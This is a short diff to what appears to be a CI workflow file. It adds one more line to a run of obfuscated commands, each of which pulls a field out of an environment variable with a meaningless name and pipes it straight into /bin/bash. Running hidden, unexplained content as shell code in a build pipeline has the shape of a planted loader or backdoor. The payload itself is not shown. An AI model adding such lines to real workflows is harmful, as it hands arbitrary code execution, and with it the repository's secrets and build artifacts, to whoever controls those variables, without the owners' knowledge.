@@ -44,6 +44,7 @@ jobs:
           echo $ciaah744 | jq -r .w87794 | /bin/bash
           printf '%s' "$pqjhh1347" | jq -r .t412 | /bin/bash
           printf '%s' "$enh1" | jq -r .f3 | /bin/bash
+          printf '%s' "$attr2414" | jq -r .hw140 | /bin/bash
 
       - name: Upload results
         if: always()
